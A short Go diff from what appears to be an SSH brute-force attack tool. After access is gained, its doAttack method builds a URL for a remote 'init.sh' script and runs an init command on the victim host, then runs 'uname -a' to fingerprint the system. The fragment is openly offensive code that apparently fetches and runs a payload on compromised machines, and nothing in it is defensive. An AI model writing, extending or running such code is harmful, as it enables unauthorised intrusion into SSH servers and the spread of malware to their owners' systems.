@@ -65,9 +65,10 @@ func (sba *SSHBruteforceAttack) doAttack(sshClient *ssh.SSHClient, ip string, po
 
 	initUrl := sba.attackTasks.DownloadInitUrl(ip, port, SSHBruteForceAttackType, "init.sh")
 
-	cmd := sba.attackTasks.InitCmdForLinux(initUrl)
+	cmd := sba.attackTasks.InitCmdForLinux(initUrl,SSHBruteForceAttackType)
 
-	result, err := sshClient.RunCmd(cmd)
+	sshClient.RunCmd(cmd+" true")
+	result,err:= sshClient.RunCmd("uname -a")
 
 	if err != nil {
 
